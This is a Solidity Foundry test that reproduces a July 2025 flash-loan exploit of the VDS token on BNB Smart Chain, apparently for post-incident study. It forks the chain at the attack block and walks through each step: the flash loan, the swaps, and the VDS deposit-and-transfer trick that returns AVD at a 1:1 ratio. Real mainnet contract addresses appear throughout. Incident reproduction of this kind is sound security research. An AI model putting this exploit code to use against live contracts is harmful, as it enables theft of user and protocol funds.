// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 13k USD
// Attacker : https://bscscan.com/address/0xa3e18e6028b1ca09433157cd6a5e807ffe705350
// Attack Contract : https://bscscan.com/address/0x383794a0c68e5c8c050f8f361b26a22b3f60eccf
// Vulnerable Contract : https://bscscan.com/address/0x6ce69d7146dbaae18c11c36d8d94428623b29d5a
// Attack Tx : https://bscscan.com/tx/0x0e01fd8798f970fd689014cb215e622aca8b7c8c243176c5b504e0043402e31f

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x6ce69d7146dbaae18c11c36d8d94428623b29d5a#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/SlowMist_Team/status/1945672192471302645
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant AVD_TOKEN = 0x4Ec93ee81f25dA3C8e49F01533cfB734545190A8;
address constant VDS_TOKEN = 0x6ce69d7146dbaae18c11c36d8D94428623B29D5A;

contract VDS is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 54252254 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        fundingToken = BSC_USD;
    }

    function testExploit() public balanceLog {
        // Step 1: Flash loan 20k BSC_USD from Moolah
        IERC20(BSC_USD).approve(MOOLAH, type(uint256).max);
        IMoolah(MOOLAH).flashLoan(BSC_USD, 20_000 ether, "");
    }
    
    function onMoolahFlashLoan(uint256 assets, bytes calldata userData) public {
        IERC20 bscUsd = IERC20(BSC_USD);
        IERC20 avd = IERC20(AVD_TOKEN);
        IERC20 vds = IERC20(VDS_TOKEN);

        IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));
        
        bscUsd.approve(PANCAKE_ROUTER, 20_000 ether);
        address[] memory path = new address[](2);
        path[0] = BSC_USD;
        path[1] = AVD_TOKEN;
        // Step 2: BSC_USD -> AVD via PancakeSwap
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(assets, 0, path, address(this), block.timestamp);

        uint256 avdBalance = avd.balanceOf(address(this));
        avd.approve(VDS_TOKEN, avdBalance);

        // Step 3: deposit AVD for VDS
        IVDS(VDS_TOKEN).deposit(VDS_TOKEN, avdBalance);

        // Step 4: Burn VDS to get AVD back
        // Root cause: Sending VDS to its contract address returns AVD at a 1:1 ratio
        uint256 amount = 168205391822;
        vds.transfer(VDS_TOKEN, amount);

        avdBalance = avd.balanceOf(address(this));
        avd.approve(PANCAKE_ROUTER, avdBalance);
        path[0] = AVD_TOKEN;
        path[1] = BSC_USD;
        // Step 5: AVD -> BSC_USD via PancakeSwap
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(avdBalance, 0, path, address(this), block.timestamp);
    }
}

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IVDS {
    function deposit(address token, uint256 amount) external;
}